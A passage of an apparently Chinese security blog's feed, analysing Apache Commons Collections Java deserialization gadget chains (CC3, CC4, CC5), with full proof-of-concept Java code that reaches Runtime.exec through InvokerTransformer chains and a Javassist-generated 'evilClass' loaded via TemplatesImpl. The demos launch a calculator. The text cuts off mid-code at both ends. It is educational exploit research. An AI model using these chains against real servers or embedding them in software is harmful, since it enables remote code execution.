baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13892510.html">https://www.cnblogs.com/nice0e3/p/13892510.html</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/119739082">https://blog.csdn.net/rfrder/article/details/119739082</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在CC6链中和CC5的利用链类似，只是CC6链中使用的是&lt;code&gt;HashSet&lt;/code&gt;去触发&lt;code&gt;LazyMap&lt;/code&gt;的get方法，而在CC5中使用的是&lt;code&gt;BadAttributeValueExpException&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections5分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections5%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections5%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T15:50:01.000Z</published>
    <updated>2022-06-04T16:28:08.478Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC5链中<code>ysoserial</code>给出的提示是需要JDK1.8并且<code>SecurityManager</code>需要是关闭的。</p><p>关于SecurityManager的介绍可以看下面的文章：</p><p><a href="https://www.cnblogs.com/wly1-6/p/10291202.html">https://www.cnblogs.com/wly1-6/p/10291202.html</a></p><span id="more"></span><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="number">123</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面和cc1链是差不多的，主要看后半段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="number">123</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(poc,tiedmap);</span><br></pre></td></tr></table></figure><p>上面代码中首先是实例化了一个<code>TiedMapEntry</code>对象，先来看下<code>TiedMapEntry</code>这个类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605000444412-133669978.png" alt="image-20220605000443399"></p><p>该类的构造方法需要2个参数，在poc中我们传入了一个<code>LazyMap</code>实例化对象和一个Object对象，接着继续往下看，可以发现两个方法，分别是<code>getKey()</code>和<code>getValue()</code>，其中<code>getValue()</code>方法会去调用构造方法赋值的map类的<code>get()</code>方法，那么如果我们把<code>LazyMap</code>对象赋值给<code>map</code>，然后调用<code>get()</code>方法的话，就可以完成cc1链中的<code>LazyMap</code>调用链了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605000738543-2004248985.png" alt="image-20220605000737903"></p><p>我们继续往下看，找下哪个地方会调用到<code>getValue()</code>方法，这里发现有多处会调用到<code>getValue()</code>方法，重点看<code>toString()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605001330346-1258458263.png" alt="image-20220605001329397"></p><p>根据前面poc中下面这部分，这里先new了一个<code>BadAttributeValueExpException</code>的对象，然后通过反射将<code>val</code>的值设置为<code>TiedMapEntry</code>实例化对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br></pre></td></tr></table></figure><p>后面的poc就是将poc对象进行反序列化，那么，我们直接看下<code>BadAttributeValueExpException</code>这个类的代码，它在反序列化的时候做了什么。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605001813381-675845214.png" alt="image-20220605001812297"></p><p>反序列化时会调用<code>BadAttributeValueExpException#readObject()</code>方法，可以看到会调用<code>get()</code>方法将val的值赋值给<code>valObj</code>，而val的值就是前面通过反射赋值的<code>TiedMapEntry</code>实例化对象，在下面又会调用<code>valObj.toString()</code>方法，接着触发getValue()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605002410480-138257297.png" alt="image-20220605002409732"></p><p>后续就是cc1链的调用过程了。</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString</span><br><span class="line">-&gt;LazyMap.get-&gt;ChainedTransformer.transform</span><br><span class="line">-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke-&gt;Class.getMethod</span><br><span class="line">-&gt;InvokerTransformer.transform-&gt;Method.invoke</span><br><span class="line">-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke-&gt;Runtime.exec</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13890340.html">https://www.cnblogs.com/nice0e3/p/13890340.html</a></p><p><a href="https://blog.csdn.net/hongduilanjun/article/details/123491483">https://blog.csdn.net/hongduilanjun/article/details/123491483</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在CC5链中&lt;code&gt;ysoserial&lt;/code&gt;给出的提示是需要JDK1.8并且&lt;code&gt;SecurityManager&lt;/code&gt;需要是关闭的。&lt;/p&gt;
&lt;p&gt;关于SecurityManager的介绍可以看下面的文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wly1-6/p/10291202.html&quot;&gt;https://www.cnblogs.com/wly1-6/p/10291202.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections4分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections4%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections4%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T15:07:35.000Z</published>
    <updated>2022-06-04T15:47:59.631Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在构造CC4链时，看POC可以看出就是把CC2 和CC3的链进行了拼接</p><span id="more"></span><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>根据<code>TransformingComparator</code> 利用链完成调用。</p><p>直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析过程就不写了，和之前的链是一样的分析过程，只是触发调用 <code>transformerChain.transform()</code>方法采用的是另外一种方法，即<code>TransformingComparator.compare()</code>。</p><p>反序列化时弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604215447007-1005138662.png" alt="image-20220604215445704"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/hongduilanjun/article/details/123491483">https://blog.csdn.net/hongduilanjun/article/details/123491483</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14032604.html">https://www.cnblogs.com/nice0e3/p/14032604.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在构造CC4链时，看POC可以看出就是把CC2 和CC3的链进行了拼接&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections3分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections3%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections3%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T12:16:12.000Z</published>
    <updated>2022-06-04T15:45:14.983Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>cc3链可以说是cc1和cc2链的结合，下面进行分析。</p><span id="more"></span><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>Commons Collections</code> 中提供了一个 <code>org.apache.commons.collections.functors.InstantiateTransformer</code> 类，其实现了 <code>Transformer</code> 接口，并且该类有一个对外公开的构造方法，可以通过传入paramTypes和args对<code>this.iParamTypes</code> 和 <code>this.iArgs</code> 赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604203632873-572689021.png" alt="image-20220604203632075"></p><p>在上图还可以看到，存在<code>InstantiateTransformer#transform()</code>方法，该方法可以通过反射实例化一个对象并且返回。</p><p>此外，我们发现 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 类的构造方法中存在一处 <code>newTransformer()</code> 调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604204348803-761573955.png" alt="image-20220604204347822"></p><p>根据前面cc2链的利用思路，如果我们可以通过 <code>InstantiateTransformer.transform()</code> 方法实例化 <code>TrAXFilter</code> 类，在实例化的过程中，如果我们将 <code>TemplatesImpl</code> 类的对象传入 <code>TrAXFilter</code> 的构造方法，那我们就可以实现前面 cc2链中<code>TemplatesImpl.newTransformer()</code> 方法的调用了。</p><h3 id="InstantiateTransformer-利用链"><a href="#InstantiateTransformer-利用链" class="headerlink" title="InstantiateTransformer 利用链"></a>InstantiateTransformer 利用链</h3><p>对于 <code>InstantiateTransformer.transform()</code> 方法的调用思路，我们可以参考cc1链。</p><p>如下为poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span 